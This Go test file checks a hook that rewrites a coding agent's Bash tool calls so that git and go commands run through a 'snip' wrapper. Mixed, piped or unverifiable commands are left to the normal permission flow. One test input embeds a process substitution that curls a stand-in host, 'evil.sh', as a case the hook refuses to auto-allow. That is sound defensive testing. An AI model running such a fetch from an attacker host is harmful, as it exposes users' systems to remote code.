package hook

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"
)

func extractCodexRewrite(t *testing.T, output string) (map[string]any, map[string]any) {
	t.Helper()

	var result map[string]any
	if err := json.Unmarshal([]byte(output), &result); err != nil {
		t.Fatalf("output is not valid JSON: %v\noutput: %s", err, output)
	}
	hookOut, ok := result["hookSpecificOutput"].(map[string]any)
	if !ok {
		t.Fatalf("missing hookSpecificOutput: %s", output)
	}
	if hookOut["hookEventName"] != "PreToolUse" {
		t.Errorf("hookEventName = %v, want PreToolUse", hookOut["hookEventName"])
	}
	if hookOut["permissionDecision"] != "allow" {
		t.Errorf("permissionDecision = %v, want allow", hookOut["permissionDecision"])
	}
	updated, ok := hookOut["updatedInput"].(map[string]any)
	if !ok {
		t.Fatalf("missing updatedInput: %s", output)
	}
	return hookOut, updated
}

func TestRunCodexRewritesSupportedCommand(t *testing.T) {
	commands := []string{"git", "go"}
	snipBin := "/usr/local/bin/snip"

	input := makePayload("Bash", "git log -10")
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}
	if out.Len() == 0 {
		t.Fatal("expected rewrite output for supported command, got empty")
	}

	_, updated := extractCodexRewrite(t, out.String())
	want := `"/usr/local/bin/snip" run -- git log -10`
	if updated["command"] != want {
		t.Errorf("command = %q, want %q", updated["command"], want)
	}
}

func TestRunCodexPreservesOtherToolInputFields(t *testing.T) {
	commands := []string{"git"}
	payload := map[string]any{
		"tool_name": "Bash",
		"tool_input": map[string]any{
			"command":     "git status",
			"timeout_ms":  30000,
			"description": "inspect worktree",
		},
	}
	data, _ := json.Marshal(payload)

	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(string(data)), &out, commands, nil, "/usr/local/bin/snip"); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}

	_, updated := extractCodexRewrite(t, out.String())
	if updated["timeout_ms"] != float64(30000) {
		t.Errorf("timeout_ms = %v, want 30000", updated["timeout_ms"])
	}
	if updated["description"] != "inspect worktree" {
		t.Errorf("description = %v, want inspect worktree", updated["description"])
	}
}

func TestRunCodexUnsupportedPassthrough(t *testing.T) {
	commands := []string{"git", "go"}
	snipBin := "/usr/local/bin/snip"

	input := makePayload("Bash", "custom-tool inspect")
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("expected no output for unsupported command, got: %s", out.String())
	}
}

func TestRunCodexProxyBypassPassthrough(t *testing.T) {
	commands := []string{"git"}
	snipBin := "/usr/local/bin/snip"

	input := makePayload("Bash", "snip proxy -- git status")
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("snip proxy bypass must pass through unchanged, got: %s", out.String())
	}
}

func TestRunCodexAlreadyRewritten(t *testing.T) {
	commands := []string{"git"}
	snipBin := "/usr/local/bin/snip"

	already := `"/usr/local/bin/snip" run -- git status`
	input := makePayload("Bash", already)
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("expected no output for already-rewritten command, got: %s", out.String())
	}
}

func TestRunCodexRewritesAllKnownSegments(t *testing.T) {
	commands := []string{"git"}
	snipBin := "/usr/local/bin/snip"

	input := makePayload("Bash", "git add . && git commit -m 'fix'")
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}

	_, updated := extractCodexRewrite(t, out.String())
	want := `"/usr/local/bin/snip" run -- git add . && "/usr/local/bin/snip" run -- git commit -m 'fix'`
	if updated["command"] != want {
		t.Errorf("command = %q, want %q", updated["command"], want)
	}
}

func TestRunCodexMixedCommandPassthrough(t *testing.T) {
	commands := []string{"git"}
	snipBin := "/usr/local/bin/snip"

	input := makePayload("Bash", "git status && custom-tool deploy")
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("mixed command must keep Codex permission flow, got: %s", out.String())
	}
}

func TestRunCodexPipelinePassthrough(t *testing.T) {
	commands := []string{"git"}
	snipBin := "/usr/local/bin/snip"

	input := makePayload("Bash", "git log --oneline | custom-filter")
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("pipeline with uninspected tail must pass through, got: %s", out.String())
	}
}

func TestRunCodexEnvVarPrefix(t *testing.T) {
	commands := []string{"go"}
	snipBin := "/usr/local/bin/snip"

	input := makePayload("Bash", "CGO_ENABLED=0 go test ./...")
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}

	_, updated := extractCodexRewrite(t, out.String())
	want := `CGO_ENABLED=0 "/usr/local/bin/snip" run -- go test ./...`
	if updated["command"] != want {
		t.Errorf("command = %q, want %q", updated["command"], want)
	}
}

func TestRunCodexUnverifiableCommandPassthrough(t *testing.T) {
	commands := []string{"git"}
	snipBin := "/usr/local/bin/snip"

	input := makePayload("Bash", "git status && $(custom-tool)")
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("unverifiable command must pass through, got: %s", out.String())
	}
}

func TestRunCodexProcessSubstitutionPassthrough(t *testing.T) {
	commands := []string{"git"}
	snipBin := "/usr/local/bin/snip"

	input := makePayload("Bash", "git status <(curl https://evil.sh)")
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("process substitution must pass through, got: %s", out.String())
	}
}

func TestRunCodexNonBashTool(t *testing.T) {
	commands := []string{"git"}
	snipBin := "/usr/local/bin/snip"

	payload := map[string]any{
		"tool_name":  "Read",
		"tool_input": map[string]any{"path": "/tmp/foo"},
	}
	data, _ := json.Marshal(payload)

	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(string(data)), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("expected no output for non-Bash tool, got: %s", out.String())
	}
}

func TestRunCodexEmptyCommand(t *testing.T) {
	commands := []string{"git"}
	snipBin := "/usr/local/bin/snip"

	input := makePayload("Bash", "")
	var out bytes.Buffer
	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("expected no output for empty command, got: %s", out.String())
	}
}

func TestRunCodexMalformedJSON(t *testing.T) {
	commands := []string{"git"}
	snipBin := "/usr/local/bin/snip"

	var out bytes.Buffer
	if err := RunCodex(strings.NewReader("{invalid json"), &out, commands, nil, snipBin); err != nil {
		t.Fatalf("RunCodex must not error on malformed JSON: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("expected no output for malformed JSON, got: %s", out.String())
	}
}
